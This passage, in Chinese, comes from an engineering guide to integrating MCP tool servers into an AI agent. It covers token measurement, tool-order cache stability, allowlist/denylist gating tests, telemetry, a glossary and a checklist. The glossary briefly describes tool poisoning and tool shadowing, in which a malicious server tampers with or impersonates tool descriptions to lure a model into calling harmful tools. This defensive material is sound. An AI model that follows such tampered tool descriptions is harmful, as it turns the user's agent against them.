   ⚠️ 亲手试一下「本地 Server 配置写错 + 无脑重连」的效果，
   你会看到用户永远停在「连接中」而不是「配置错了」。
3. **超时要分层**（§9.2），且**启动时断言 `inner < outer`**。

**加分实验**：给远程 Server 加一个 OAuth 流程。
这会让你理解为什么 §8.8 强调**OAuth 参数必须从日志脱敏**
——你会在调试日志里看到 `code` 和 `state` 明文躺在那里。

---

### 阶段 4：工具多了，做 Token 治理（一到两天）

**目标**：把工具数量堆到 60+（可以让一个 Server 循环生成 50 个工具），
然后**测量**它的代价。

**必做的四个测量**（这一阶段的核心是「先测量，再优化」）：

```bash
# ① 工具定义占了多少 token（粗算：字符数 / 4）
#    先把请求体存下来，再算
# ② 工具定义占上下文窗口的比例 → 超 20% 就该做 Tool Search
# ③ 连续两轮请求的工具顺序是否稳定（★ 注意不要 sort，见 §11.5）
grep -o '"name":"mcp__[^"]*"' 请求1.json > /tmp/o1
grep -o '"name":"mcp__[^"]*"' 请求2.json > /tmp/o2
diff /tmp/o1 /tmp/o2 && echo "顺序稳定 ✅" || echo "顺序不稳定 ❌"
# ④ cache 命中率：cache_read ÷ 总 input token
```

**然后按 ROI 顺序优化**：

1. **先改描述**（§6.4）——零成本，效果立竿见影
2. **再修顺序**（§6.5）——一行 `sort`，可能让 cache 命中率从个位数跳到 70%+
3. **最后才做 Tool Search**（§6.3）——它增加约 50% 往返，
   ⚠️ **工具少于 15 个时它是纯粹的过度工程**

**这个顺序本身是这一阶段最重要的收获**：
**最贵的优化往往不是最该先做的那个。**

---

### 阶段 5：加安全门控与可观测（一天）

**目标**：实现 §8.4 的三层门控，并给每个环节加埋点。

**门控实现的必测清单**（⚠️ 三种情况各一个用例，见 §11.8）：

```
allowedServers = undefined  → 应放行所有
allowedServers = []         → 应【拒绝所有】   ★ 最容易写错的一格
allowedServers = [非空]     → 应只放行匹配的
denylist 和 allowlist 同时命中 → 应【拒绝】（deny wins）
```

**埋点清单**（**没有埋点就没法发现 §11 那些静默失效**）：

| 埋什么 | 为什么 | 对应的失效模式 |
| --- | --- | --- |
| 每个 Server 的连接耗时、最终状态 | 发现慢启动和反复重连 | R1、R10 |
| **每个工具的调用次数** | **零调用是重要信号** | R2 |
| 工具定义的 token 数、占窗口比例 | 成本归因 | §6 |
| **每轮的工具顺序 hash** | **变化即 cache 击穿** | R5 |
| 每次权限决策（放行/拒绝/询问） | 发现静默拦截 | R2 成因 5 |
| 每层超时的实际触发次数 | **某层恒为 0 说明它是死代码** | R4 |

**最后一行那条埋点最值得单独说**：
如果你的「单次工具调用超时」触发次数**恒为 0**，
两种可能——① 从来没超时过（好事）；
② **它被外层超时掩蔽了，是死代码**（§11.4）。
**而你分不清是哪一种，除非同时埋了外层的触发次数。**

---

### 13.6 五个阶段之后你会有什么

一个**能诚实说出自己边界**的 MCP 接入层：

- 知道它支持哪些传输，**以及为什么不支持另一些**
- 知道每个常量（并发 3、截断 2048、超时 120s）**是为了防什么具体故障**
- 知道哪些安全防线**不防什么**（§8.9 那张表）
- 有埋点能发现 §11 那十二类静默失效

⚠️ **最后一条提醒**：本文所有可复跑命令，
**请按你自己的实际字段名跑一遍再用**。
📌 教学层文档最容易犯的错就是命令里的字段名靠猜——
猜错的命令会**静默返回空结果**，然后你据此得出一个假结论。
这正是 §11 反复讲的那类错误。

---
<a id="appendix"></a>
## 附录

### A. 术语表

| 术语 | 一句话解释 | 详见 |
| --- | --- | --- |
| **MCP** | Model Context Protocol，AI 应用连外部工具的开放协议 | §0 |
| **Host** | AI 应用本体（Claude Desktop、Cursor、sid-code） | §0.5 |
| **Client** | 协议客户端，和**一个** Server 保持 1:1 连接 | §0.5 |
| **Server** | 暴露 Tools/Resources/Prompts 的服务进程 | §0.5 |
| **Tools** | **模型**控制的可执行函数（AI 要**做**什么） | §2.2 |
| **Resources** | **应用**控制的只读数据（AI 要**知道**什么） | §2.3 |
| **Prompts** | **用户**控制的交互模板（用户要**怎样的交互**） | §2.4 |
| **JSON-RPC 2.0** | MCP 的数据层协议，三种消息靠 `id` 区分 | §3.2 |
| **Notification** | **没有 `id`** 的单向消息，不需要也不允许回复 | §3.2 |
| **stdio** | 本地传输：spawn 子进程，走 stdin/stdout，**stderr 留给日志** | §4.1 |
| **Streamable HTTP** | 远程传输：**单端点 + SSE 可选**，2025-03-26 引入 | §4.2 |
| **能力协商** | 连接时双方声明支持哪些原语/扩展 | §2.6 |
| **annotations** | 工具的行为标注（`readOnlyHint` 等）。**是提示不是保证** | §2.2 |
| **`server/discover`** | 2026-07-28 新增的**必须实现**的 RPC，一次拿版本+能力+身份 | §5.1 |
| **`resultType`** | 2026-07-28 起必填：`complete` 或 `input_required`。**缺失时当 complete** | §5.1 |
| **Extensions** | 反向 DNS 命名的可选扩展（`io.modelcontextprotocol/tasks`） | §5.3 |
| **MCP Apps** | 官方 UI 扩展（SEP-1865），`ui://` 资源 + 强制 iframe 沙箱 | §5.3 |
| **Tool Search** | 按语义检索 Top-K 工具再注入，约 85% Token 减少 | §6.3 |
| **Tool Poisoning** | Server 更新后**篡改工具描述**，诱导模型调恶意工具 | §8.2 |
| **Tool Shadowing** | 恶意 Server 注册同名工具劫持调用 | §8.2 |
| **deny wins** | denylist 优先于 allowlist，**绝对不可覆盖** | §8.4 |
| **fail-closed** | 不确定时拒绝/询问，而非放行（审批默认 `pending`） | §8.5 |
| **Approval Fatigue** | 审批太频繁 → 用户无脑同意 → **安全性反而更低** | §8.6 |
| **MCP Gateway** | agent 世界的 Nginx：认证/审计/熔断/限流/工具路由的唯一入口 | §9.7 |
| **Elicitation** | Server 向用户请求补充信息（新版走 MRTR） | §5.4 |

### B. 三十秒自检清单

接入 MCP 前后各过一遍。**任何一条答不出来，回对应章节。**

**协议认知**
- [ ] 我知道当前规范版本是哪一个，我实现的是哪一个（§1.2）
- [ ] 我在自己代码里搜过 `initialize` / `Mcp-Session-Id` / `ping` / `Last-Event-ID`（§1.3）
- [ ] 我能区分协议错误（`error`）和业务错误（`result.isError`）（§3.4）

**接入层**
- [ ] 日志走 stderr，stdout 只有协议消息（§11.1）
- [ ] 有显式的连接状态机，不是散落的布尔标志（§7.4）
- [ ] 本地/远程并发上限**不同**（§7.5）
- [ ] 工具名有命名空间，且规范化处理了连续下划线（§7.6）
- [ ] 描述和结果都有截断，**且结果按 token 再限一层**（§7.8）
- [ ] instructions 走增量注入，**带 `<system-reminder>` 围栏**（§7.9）
- [ ] 本地 Server 断开**不自动重连**，远程才重连（§7.10）

**成本**
- [ ] 我测过工具定义占上下文窗口的比例（> 20% 该做 Tool Search）（§6.8）
- [ ] 我验证过**连续两轮的工具顺序是稳定的**（排查时不要 sort）（§11.5）
- [ ] 我知道自己的 cache 命中率（§6.8）

**安全**
- [ ] allowlist 的 `undefined` / `[]` / 非空**三种情况各有测试**（§11.8）
- [ ] denylist 优先且不可覆盖（§8.4）
- [ ] 项目级配置默认 `pending` 而非 `approved`（§8.5）
- [ ] 所有工具参数按**不可信输入**处理（**不做字符串拼接进 shell**）（§8.3）
- [ ] OAuth 的 `state`/`code`/`code_verifier` 从日志脱敏（§8.8）
- [ ] 我能说出每道防线**不防什么**（§8.9）

**可靠性 / 可观测**
- [ ] 超时从外到内严格递减，**且启动时断言**（§9.2、§11.4）
- [ ] 熔断有「最少 N 次请求」条件（§9.4）
- [ ] 健康检查**含业务层**（不只是进程活着 + 握手成功）（§9.5）
- [ ] 每个工具的调用次数有埋点（**零调用是信号**）（§11.2）

## 最后：这份文档想让你记住的三件事

**一、协议只是入场券，工程才是主体。**
MCP 的协议本体四条消息就能讲完（§0.1），
但把它接进一个真实 agent 要做十件事（§7），
真正实现 JSON-RPC 收发的部分不到工作量的四分之一。
**面试问「你懂 MCP 吗」，考的从来不是你能不能背出三大原语。**

**二、瓶颈和你的直觉相反。**
不是网络延迟，是 Token（§6）；
不是 AI 新型攻击，是 90 年代的命令注入（§8.3）；
不是协议不够强，是客户端太天真（§6.7）。
**每次你觉得「这个我猜得到」的时候，都值得去查一下真实数据。**

**三、最贵的错误不报错。**
§11 那十二条失效模式——连接是绿的、测试全绿、日志没有 ERROR，
而结论是错的。它们的共同点是**「一个本该失败的东西，成功了」**，
之所以静默，**是因为「成功」这条路径上没人设检查点**。

所以排查的通用手法只有一句：

> 🔑 **不要问「有没有报错」，要问「如果这里坏了，我会知道吗」。**

而这份文档本身就是这条纪律的一个例子：
它的三份源材料在写作时全部正确，四个月后有四处协议机制已被删除（§1.1）。
**照抄不会报错，只会让你实现一个不存在的协议。**

📌 **所以：凡引用「现状」，先复跑，先核验。**
